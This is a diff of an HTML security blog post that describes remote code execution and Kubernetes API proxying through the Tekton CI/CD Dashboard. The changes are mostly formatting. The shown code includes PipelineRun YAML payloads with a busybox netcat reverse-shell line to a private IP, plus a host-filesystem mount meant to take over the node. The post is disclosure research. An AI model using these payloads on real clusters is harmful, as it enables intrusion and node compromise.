@@ -8,7 +8,7 @@
   <meta name="twitter:title" content="Tekton Dashboard RCE and Kubernetes API Proxy">
   <meta name="twitter:description" content="This is the story of how I found two vulnerabilities in the Tekton CI/CD Dashboard component that allow remote code execution and a potential node takeover if deployed in read/write mode as well as pre-authenticated access to the Kubernetes API server in all modes.
 Both vulnerabilities were treated as intended and are thus still exploitable. The documentation was changed and the default mode is now read-only instead of read/write.
-It started when I stumbled upon an unusual finding during an assessment.">
+It started when I stumbled upon an unusual finding during an assessment. The scanning of our internal attack surface management solution reported either an internet-exposed Kubernetes API server, which is not too uncommon, or an exposed kubelet API. The latter hadn’t been observed in our client’s scope before, prompting me to investigate further.">
 
     <link rel="alternate" type="application/rss+xml" href="https://blog.flomb.net//index.xml" title="Flomb Blog">
 
@@ -18,7 +18,7 @@ It started when I stumbled upon an unusual finding during an assessment.">
     
     <meta name="description" content="This is the story of how I found two vulnerabilities in the Tekton CI/CD Dashboard component that allow remote code execution and a potential node takeover if deployed in read/write mode as well as pre-authenticated access to the Kubernetes API server in all modes.
 Both vulnerabilities were treated as intended and are thus still exploitable. The documentation was changed and the default mode is now read-only instead of read/write.
-It started when I stumbled upon an unusual finding during an assessment." />
+It started when I stumbled upon an unusual finding during an assessment. The scanning of our internal attack surface management solution reported either an internet-exposed Kubernetes API server, which is not too uncommon, or an exposed kubelet API. The latter hadn&rsquo;t been observed in our client&rsquo;s scope before, prompting me to investigate further." />
     <meta name="author" content="" />
     
 
@@ -166,8 +166,7 @@ It started when I stumbled upon an unusual finding during an assessment." />
 <h3 id="proxying-with-tekton">Proxying with Tekton</h3>
 <p>As indicated by the name of the service account, we were dealing with <a href="https://tekton.dev/">Tekton</a> and its dashboard component:</p>
 <blockquote>
-<p>Tekton is a powerful and flexible open-source framework for creating CI/CD systems, allowing developers to build, test, and deploy across cloud providers and on-premise systems.</p>
-</blockquote>
+<p>Tekton is a powerful and flexible open-source framework for creating CI/CD systems, allowing developers to build, test, and deploy across cloud providers and on-premise systems.</p></blockquote>
 <p>Rather than immediately reconsidering the attack surface, I decided to investigate the unusual proxying behavior further. I checked the <a href="https://tekton.dev/docs/dashboard/install/#installing-tekton-dashboard-on-kubernetes">documentation</a> and found that the installation is just a Kubernetes configuration YAML file:</p>
 <pre tabindex="0"><code>kubectl apply --filename https://storage.googleapis.com/tekton-releases/dashboard/latest/release.yaml
 </code></pre><p>This file contains a definition of a <code>tekton-dashboard</code> service account and its role bindings. While I didn&rsquo;t review the roles exhaustively, I quickly noticed read access to <code>pods</code> and <code>pods/logs</code>. This presented a potential quick win because it meant access to container stdout and pod definitions, both of which could contain sensitive information.</p>
@@ -305,41 +304,41 @@ It started when I stumbled upon an unusual finding during an assessment." />
 </span></span><span style="display:flex;"><span>...
 </span></span></code></pre></div><p>Custom resource creation requests are validated according to the OpenAPI v3 schema included in their definition. In this case however it does not provide further insights as it only expects a valid JSON object. Luckily, the repository contained some <a href="https://github.com/tektoncd/pipeline/blob/main/docs/developers/controller-logic.md">documentation</a> indicating that every CRD has a matching go struct at <code>pkg/apis/pipeline/v1/</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">...</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// PipelineRunSpec defines the desired state of PipelineRun
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">PipelineRunSpec</span> <span style="color:#66d9ef">struct</span> {
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// +optional
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">PipelineRef</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">PipelineRef</span> <span style="color:#e6db74">`json:&#34;pipelineRef,omitempty&#34;`</span>
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Specifying PipelineSpec can be disabled by setting
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// `disable-inline-spec` feature flag..
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// +optional
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">PipelineSpec</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">PipelineSpec</span> <span style="color:#e6db74">`json:&#34;pipelineSpec,omitempty&#34;`</span>
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Params is a list of parameter names and values.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// +listType=atomic
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">Params</span> <span style="color:#a6e22e">Params</span> <span style="color:#e6db74">`json:&#34;params,omitempty&#34;`</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// PipelineRunSpec defines the desired state of PipelineRun</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">PipelineRunSpec</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// +optional</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">PipelineRef</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">PipelineRef</span> <span style="color:#e6db74">`json:&#34;pipelineRef,omitempty&#34;`</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Specifying PipelineSpec can be disabled by setting</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// `disable-inline-spec` feature flag..</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// +optional</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">PipelineSpec</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">PipelineSpec</span> <span style="color:#e6db74">`json:&#34;pipelineSpec,omitempty&#34;`</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Params is a list of parameter names and values.</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// +listType=atomic</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Params</span> <span style="color:#a6e22e">Params</span> <span style="color:#e6db74">`json:&#34;params,omitempty&#34;`</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Used for cancelling a pipelinerun (and maybe more later on)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// +optional
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">Status</span> <span style="color:#a6e22e">PipelineRunSpecStatus</span> <span style="color:#e6db74">`json:&#34;status,omitempty&#34;`</span>
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Time after which the Pipeline times out.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// Currently three keys are accepted in the map
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// pipeline, tasks and finally
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// with Timeouts.pipeline &gt;= Timeouts.tasks + Timeouts.finally
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// +optional
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">Timeouts</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">TimeoutFields</span> <span style="color:#e6db74">`json:&#34;timeouts,omitempty&#34;`</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Used for cancelling a pipelinerun (and maybe more later on)</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// +optional</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Status</span> <span style="color:#a6e22e">PipelineRunSpecStatus</span> <span style="color:#e6db74">`json:&#34;status,omitempty&#34;`</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Time after which the Pipeline times out.</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Currently three keys are accepted in the map</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// pipeline, tasks and finally</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// with Timeouts.pipeline &gt;= Timeouts.tasks + Timeouts.finally</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// +optional</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Timeouts</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">TimeoutFields</span> <span style="color:#e6db74">`json:&#34;timeouts,omitempty&#34;`</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// TaskRunTemplate represent template of taskrun
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// +optional
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">TaskRunTemplate</span> <span style="color:#a6e22e">PipelineTaskRunTemplate</span> <span style="color:#e6db74">`json:&#34;taskRunTemplate,omitempty&#34;`</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// TaskRunTemplate represent template of taskrun</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// +optional</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">TaskRunTemplate</span> <span style="color:#a6e22e">PipelineTaskRunTemplate</span> <span style="color:#e6db74">`json:&#34;taskRunTemplate,omitempty&#34;`</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Workspaces holds a set of workspace bindings that must match names
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// with those declared in the pipeline.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// +optional
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// +listType=atomic
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">Workspaces</span> []<span style="color:#a6e22e">WorkspaceBinding</span> <span style="color:#e6db74">`json:&#34;workspaces,omitempty&#34;`</span>
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// TaskRunSpecs holds a set of runtime specs
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// +optional
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// +listType=atomic
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">TaskRunSpecs</span> []<span style="color:#a6e22e">PipelineTaskRunSpec</span> <span style="color:#e6db74">`json:&#34;taskRunSpecs,omitempty&#34;`</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Workspaces holds a set of workspace bindings that must match names</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// with those declared in the pipeline.</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// +optional</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// +listType=atomic</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Workspaces</span> []<span style="color:#a6e22e">WorkspaceBinding</span> <span style="color:#e6db74">`json:&#34;workspaces,omitempty&#34;`</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// TaskRunSpecs holds a set of runtime specs</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// +optional</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// +listType=atomic</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">TaskRunSpecs</span> []<span style="color:#a6e22e">PipelineTaskRunSpec</span> <span style="color:#e6db74">`json:&#34;taskRunSpecs,omitempty&#34;`</span>
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
 </span></span></code></pre></div><p>A <a href="https://kubernetes.io/docs/concepts/architecture/controller/">controller</a> in Kubernetes monitors resources it is interested in and it &ldquo;reconciles&rdquo; in response to relevant events. That means it changes the clusters state to match the desired state. In this example that could mean creating a specific pod whenever a new PipelineRun is requested. Another controller, the kube-scheduler, notices the requirement of a new pod and goes on to schedule it to a node.</p>
@@ -350,7 +349,7 @@ It started when I stumbled upon an unusual finding during an assessment." />
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">script</span>: &gt;<span style="color:#e6db74">
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  #!/usr/bin/env sh
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  busybox nc 192.168.58.1 8000 -e /bin/sh</span>  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  busybox nc 192.168.58.1 8000 -e /bin/sh</span>
 </span></span></code></pre></div><p>RCE is nice, but I thought this looks a lot like a normal pod definition, can it do anything malicious like mounting the node&rsquo;s file system?</p>
 <p>I tried to get a minimal PipelineRun by repeatedly removing potentially unimportant lines until it breaks, which finally led me to:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">tekton.dev/v1</span>
@@ -371,7 +370,7 @@ It started when I stumbled upon an unusual finding during an assessment." />
 </span></span><span style="display:flex;"><span>              <span style="color:#f92672">name</span>: <span style="color:#ae81ff">clone</span>
 </span></span><span style="display:flex;"><span>              <span style="color:#f92672">script</span>: |<span style="color:#e6db74">
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                #!/usr/bin/env sh 
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                busybox nc 192.168.49.1 8000 -e /bin/sh</span>                
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                busybox nc 192.168.49.1 8000 -e /bin/sh</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">taskRunTemplate</span>:
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">serviceAccountName</span>: <span style="color:#ae81ff">default</span>
 </span></span></code></pre></div><p>Pretending this is just a pod we could mount the host&rsquo;s file system with:</p>
@@ -393,7 +392,7 @@ It started when I stumbled upon an unusual finding during an assessment." />
 </span></span><span style="display:flex;"><span>              <span style="color:#f92672">name</span>: <span style="color:#ae81ff">clone</span>
 </span></span><span style="display:flex;"><span>              <span style="color:#f92672">script</span>: |<span style="color:#e6db74">
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                #!/usr/bin/env sh 
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                busybox nc 192.168.49.1 8000 -e /bin/sh</span>                
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                busybox nc 192.168.49.1 8000 -e /bin/sh</span>
 </span></span><span style="display:flex;"><span>              <span style="color:#f92672">volumeMounts</span>:
 </span></span><span style="display:flex;"><span>                - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/var/noderoot</span>
 </span></span><span style="display:flex;"><span>                  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">noderoot</span>
@@ -425,6 +424,9 @@ It started when I stumbled upon an unusual finding during an assessment." />
     <div class="f:fade-30 f:14 mb:8"></div>
 </footer></div>
     </div>
+
+
+    
 </body>
 
 </html>
